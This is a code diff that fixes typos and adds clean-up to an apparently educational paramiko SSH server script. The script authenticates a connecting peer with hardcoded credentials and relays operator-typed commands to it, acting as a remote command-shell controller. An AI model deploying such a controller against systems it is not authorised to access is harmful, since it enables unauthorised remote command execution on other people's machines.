@@ -17,7 +17,7 @@ class Server (paramiko.ServerInterface):
         return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
 
     def check_auth_password(self, username, password) :
-        if (username == 'napeoleon') and (password == 'liger'):
+        if (username == 'napoleon') and (password == 'liger'):
             return paramiko.AUTH_SUCCESSFUL
 
 if __name__ == '__main__':
@@ -31,7 +31,7 @@ if __name__ == '__main__':
         print('[+] Listening for connection ...')
         client, addr = sock.accept()
     except Exception as e:
-        print('[-] Listen failed: ' +str(e))
+        print('[-] Listen failed: ' + str(e))
         sys.exit(1)
     else:
         print(f'[+] Got a connection! from {addr}')
@@ -53,12 +53,17 @@ if __name__ == '__main__':
             while True:
                 command = input("Enter command:")
                 if command != 'exit':
-                    chan.send(commmand)
+                    chan.send(command)
                     r = chan.recv(8192)
                     print(r.decode())
                 else:
                     chan.send('exit')
                     print('exiting...')
+                    bhSession.close()
+                    break
+        except KeyboardInterrupt:
+            bhSession.close()
+
                 
             
 
